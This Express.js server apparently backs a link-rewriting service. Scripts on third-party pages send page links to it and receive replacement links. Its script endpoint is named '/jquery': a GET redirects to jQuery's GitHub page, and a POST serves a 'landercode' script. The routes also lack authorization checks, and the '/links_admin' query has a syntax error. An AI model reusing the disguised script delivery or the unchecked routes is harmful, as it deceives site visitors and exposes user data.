
//module dependencies
var express = require("express")
  , http = require("http")
  , mysql = require("mysql")
  , path = require("path")
  , app = express()
  , _ = require("underscore")
  , config = require("./config")
  , utils = require("./utils")
  , validator = require("validator")
  , bcrypt = require("bcrypt-nodejs")
  , randomstring = require("randomstring")
  , urlParser = require("url")
  , methodOverride = require("method-override")
  , bodyParser = require("body-parser")
  , fs = require("node-fs")
  , mustache = require("mustache");

app.use(function logErrors(err, req, res, next) {
  console.error(err.stack);
  next(err);
});

// Compression (gzip)
app.use(express.compress() );
app.use(express.bodyParser());
app.use(express.urlencoded({extended:true}));            // Needed to parse POST data sent as JSON payload
app.use(bodyParser.json());

// Cookie config
app.use( express.cookieParser( config.cookieSecret ) );           // populates req.signedCookies
app.use( express.cookieSession( config.sessionSecret ) );         // populates req.session, needed for CSRF

// We need serverside view templating to initially set the CSRF token in the <head> metadata
// Otherwise, the html could just be served statically from the public directory
app.set('view engine', 'html');
app.set('views', __dirname + '/views' );
app.engine('html', require('hbs').__express);

app.use(express.static(__dirname + '/../public'));
app.use(express.csrf());

app.use(app.router);

var db = mysql.createConnection(config.dbConnectionInfo);
db.connect();

function setClientOrAdminMode(req, res, next) {
    if(config.clientMode) {
        if(req.url.substring(0,7) == '/jquery' || req.url.substring(0,16) == '/all_domains/new') {
            next();
        }    
    } else {
        if(req.url.substring(0,7) != '/jquery' && req.url.substring(0,16) != '/all_domains/new') {
            next();
        }
    }
}


app.get("/", function(req, res) {
    //console.log(req);
    res.render('index', { csrfToken: req.csrfToken() });
});

app.get("/login", function(req, res) {
    res.render('index', { csrfToken: req.csrfToken() });
});



// GET /api/auth
// @desc: checks a user's auth status based on cookie
app.get("/api/auth", function(req, res) {
    db.query("SELECT * FROM users WHERE user = ? AND auth_token = ?", [ req.signedCookies.user_id, req.signedCookies.auth_token ], function(err, rows){
        if(rows.length == 1){
            var row = rows[0];
            res.json({ user: _.omit(row, config.userDataOmit) });   
        } else {  
            res.json({ error: "Client has no valid login cookies."  });   
        }
    });
});

// POST /api/auth/login
// @desc: logs in a user
app.post("/api/auth/login", function(req, res) {

    db.query("SELECT * FROM users WHERE user = ?", [ req.body.username ], function(err, rows) {
        if(rows.length == 1) {
            var row = rows[0];
            
            // Compare the POSTed password with the encrypted db password
            if(bcrypt.compareSync( req.body.password, row.hash)) {
                
                if(!row.approved) {
                    res.json({error: "Your account isn't activated yet."});
                } else {
                    res.cookie('user_id', row.user, { signed: true, maxAge: config.cookieMaxAge  });
                    res.cookie('auth_token', row.auth_token, { signed: true, maxAge: config.cookieMaxAge  });

                    // Correct credentials, return the user object
                    res.json({ user: _.omit(row, config.userDataOmit) });
                }
            } else {
                // Username did not match password given
                res.json({ error: "Invalid username or password."  });   
            }
        } else {
            // Could not find the username
            res.json({ error: "Username does not exist."  });   
        }
    });

});


// POST /api/auth/signup
// @desc: creates a user
app.post("/api/auth/signup", function(req, res) {
    
    var secretUsername = randomstring.generate(30);
    var secretNotUnique = true;
    //ensure unique string
    db.query("SELECT secret_username FROM users;", function(err, docs) {
        for(var i=0 ; i<docs.length ; i++) {
            if(secretUsername == docs[i]) {
                secretUsername = randomstring.generate(30);
                i=0; //start over
            }
        }
    });

    db.query("INSERT INTO users(user, hash, approved, secret_username, auth_token) VALUES (?, ?, ?, ?, ?)",
            [req.body.username, bcrypt.hashSync(req.body.password, bcrypt.genSaltSync(8)), 0, secretUsername, bcrypt.genSaltSync(8)], function(err, rows) {
        if(err) {
            console.log(err);
            res.json({ error: "Username has been taken.", field: "username" }); 
        } else {
            // Retrieve the inserted user data
            db.query("SELECT * FROM users WHERE user = ?", [ req.body.username ], function(err, rows) {
                if(rows.length == 1) {
                    var row = rows[0];
                    // Set the user cookies and return the cleansed user data
                    res.cookie('user_id', row.user, { signed: true, maxAge: config.cookieMaxAge  });
                    res.cookie('auth_token', row.auth_token, { signed: true, maxAge: config.cookieMaxAge  });
                    res.json({ user: _.omit(row, config.userDataOmit) });   
                } else {
                    console.log(err, rows);
                    res.json({ error: "Error while trying to register user." }); 
                }
            });
        }
    });
  
});

// POST /api/auth/logout
// @desc: logs out a user, clearing the signed cookies
app.post("/api/auth/logout", function(req, res) {
    
    var user = req.signedCookies.user_id;
    var datetime = utils.toMysqlFormat(new Date());
    db.query('UPDATE users SET last_login = ? WHERE users.user = ?;', [datetime, user], function(err, docs) {
        if(err) throw err;
    });

    res.clearCookie('user_id');
    res.clearCookie('auth_token');
    res.json({ success: "User successfully logged out." });
});

// POST /api/auth/remove_account
// @desc: deletes a user
/*
app.post("/api/auth/remove_account", function(req, res) {
    db.query("DELETE FROM users WHERE user = ? AND auth_token = ?", [ req.signedCookies.user_id, req.signedCookies.auth_token ], function(err, rows) {
        if(err) {
            res.json({ error: "Error while trying to delete user." }); 
        } else {
            res.clearCookie('user_id');
            res.clearCookie('auth_token');
            res.json({ success: "User successfully deleted." });
        }
    });
});
*/


app.get('/admindex', function( req, res) {
    db.query('select * from all_domains ORDER BY user ASC', function(err, docs) {
        res.render('admindex', {domains: docs});
    });
});



app.get('/landercode', function( req, res) {
    var user = req.session.user_id; 
    fs.readFile('./client/compressed/compressed-initial.js', function(err, data) {
        if(err) throw err;
        db.query("SELECT secret_username FROM users WHERE user = ?", [user], function(err, docs) {
            if(docs.length == 1) {
                var replacedFile = String(data).replace('replaceme', docs[0].secret_username);       

                res.send({
                    landercode:  String(replacedFile)
                });

            }
        });
    });     
});


app.get('/my_domains', function (req, res) {
    db.query('select * from my_domains where user = ?', [req.session.user_id],function(err, docs) {
        res.render('my_domains', {domains: docs});
    });
});

// Save the new registered domain
app.post('/my_domains', function (req, res) {
   var url=req.body.url;

   if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
       url = "http://" + url;
   }

   url = url.replace("http://www.", "http://");
   url = url.replace("https://www.", "https://");

   var base_url = urlParser.parse(url).hostname;

   if(validator.isURL(url)) {
       db.query('CALL insert_my_domain(?, ?);', [base_url, req.session.user_id], function(err, docs) {
           if (err) {
               res.json(err);
           } else {
               db.query('SELECT id FROM my_domains WHERE (user = ? AND url = ?)', [req.session.user_id, base_url], function(err, docs) {
                   if (err) {
                       res.json(err);
                   } else {
                       if(docs[0]) {
                           var id = docs[0].id;            
                           if (id) {
                               var body = {
                                   message: "success",
                                   id: id,
                                   url: base_url
                               };
                               res.status(200)
                               res.send(body);
                           }
                       }
                   }
               });
           }
       });            
   }
   else {
       var msg = {status: 'Invalid URL.'};
       res.render('my_domains', {data: msg});
   }
});

app.get('/my_domains/delete', function (req, res) {
    var id=req.query.id;
    
    db.query('CALL delete_my_domain(?, ?);', [id, req.session.user_id], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              id: id 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/all_domains', function (req, res) {
    db.query('select url, id, registered, count, rate, creation_date from all_domains where user = ?', [req.session.user_id], function(err, docs) {
        res.render('all_domains', {domains: docs});
    });
});

app.get('/all_domains/list', function(req, res) {
    db.query('select * from all_domains where user = ?', [req.session.user_id], function(err, rows, fields) {
        if (err) res.json(err);
        else {
            res.send({
                    json: rows
            });
        }
    });
});

app.post('/all_domains/delete', function (req, res) {
    var id=req.body.id;
    
    db.query('DELETE from all_domains where id = ?;', [id], function(err, docs) {
        if (err) res.json(err);
        else {
            res.send('');
        }
    })
});

app.get('/all_domains/new', function (req, res) {
    var url=req.query.url;

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var datetime = utils.toMysqlFormat(new Date());
    db.query('CALL insert_domain(?, ?, ?, ?);', [url, req.session.user_id, datetime, base_url], function(err, docs) {
        if (err) res.json(err);
        else {
            var body = "success";
            res.writeHead(200, {
                'Content-Length': body.length,
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
            });
                
            res.end(body);
        }
    })
});

app.post('/all_domains/new', function (req, res) {
    var url = req.query.url;

    if (typeof url === "undefined" || url == '') {
        res.send('');
        return;
    }

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var links = req.body.hrefs;
    var secretUsername = req.body.user;

    var datetime = utils.toMysqlFormat(new Date());

    db.query("SELECT user FROM users WHERE secret_username = ?", [secretUsername], function(err, usernameDocs) {
        if(err) throw err;
        if(usernameDocs.length == 1) {
           var user = usernameDocs[0].user;

           db.query('CALL insert_domain(?, ?, ?, ?);', [url, user, datetime, base_url], function(err, InsertDomainDocs) {
                if(err) throw err;
                db.query('CALL get_links(?, ?);', [url, user], function(err, getLinksDocs, fields) {
                    if(err) throw err;
                    var responseArray = getLinksDocs[0];
                    var responseArrayLen = responseArray.length;
                    var responseObject = {};

                    for (var i = 0; i < responseArrayLen; i++) {
                        if (i == 0) {
                            responseObject.rate = responseArray[i].rate;
                            responseObject.bc_rate = responseArray[i].bc_rate;
                        }

                        var key = responseArray[i].link;
                        responseObject[key] = { bc_link: responseArray[i].bc_link, user_link: responseArray[i].user_link }
                    }

                    res.writeHead(200, {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'POST, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });

                    res.end(JSON.stringify(responseObject));

                    for (var key in links) {
                        db.query('CALL insert_link(?, ?, ?);', [url, key, user], function(err2, rows) {
                        });
                    }
                }); 
            });
        }
    });
});

app.post('/all_domains/edit_rate', function (req, res) {
    var url=req.body.url;
    var rate=req.body.rate;
    db.query('UPDATE all_domains SET rate = ? WHERE all_domains.url = ? AND all_domains.user = ?;', [rate, url, req.session.user_id], function(err, rows) {
        if (err) {
            res.json(err)
        } else {
            var body = {
                message: "success",
                rate: rate
            };
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/edit_form', function (req, res) {
    var domain=req.query.domain;
    db.query('CALL get_links(?, ?)', [domain, req.session.user_id], function(err, docs) {

        if(docs[0][0]) {
            res.render('edit_form', {rows: docs[0]}); 
        }  
        else {
            res.redirect('links_fail_page?domain=' + domain);
        }
        
    });
});

app.get('/links_fail_page', function (req, res) {
    var domain=req.query.domain;
    res.render('links_fail_page', {url: domain});
});

app.get('/links_admin', function (req, res) {
    var domain=req.query.domain;
    db.query('SELECT * FROM links WHERE domain LIKE CONCAT('%', ?, '%')', [domain], function(err, docs) {
        res.render('links_admin', {rows: docs});
    });
});

app.post('/links/edit', function (req, res) {
    var domain=req.body.domain;
    var link=req.body.link;
    var user_link=req.body.user_link;

    if (user_link.substring(0, 7) != "http://" && user_link.substring(0, 8) != "https://") {
        user_link = "http://" + user_link;
    }

    if (validator.isURL(user_link)) {
        db.query('CALL insert_user_link(?, ?, ?, ?);', [domain, link, user_link, req.session.user_id], function(err, docs) {
            if (err) {
             res.json(err);
            } else {
              var body = {
                 message: "success",
                 domain: domain,
                 link: link,
                 user_link: user_link
             };
             res.status(200);
             res.send(body);
           }
        });
    }
    else {
        var msg = {status: 'Invalid URL.'};
        res.send({data: msg});
    }
});

app.get('/all_domains/new_domains', function (req, res) {
    var user = req.session.user_id;
    db.query('SELECT DISTINCT all_domains.base_url FROM users, all_domains WHERE (users.last_login < all_domains.creation_date) AND (users.user = ?);', [user], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              urls: docs 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

//Get and load client js
app.get('/jquery', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
      'Location': 'https://github.com/jquery/jquery',
      'Expires': (new Date()).toGMTString()
    });

    res.end();

});

app.post('/jquery', function(req, res) {
    var user=req.body.version;

    db.query("SELECT secret_username FROM users WHERE secret_username = ?", [user], function(err, docs) {
        if(docs.length == 1) {
            fs.readFile('./client/compressed/compressed-landercode.js', function(err, data) {
                if(err) throw err;
                
                var replacedFile = String(data).replace('replaceme', user);       
               
                res.writeHead(200, {
                        'Content-Length': replacedFile.length,
                        'Content-Type': 'text/plain',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });
                    res.end(replacedFile);
            }); 
        }
    });

});

app.all('*', setClientOrAdminMode);

module.exports = app;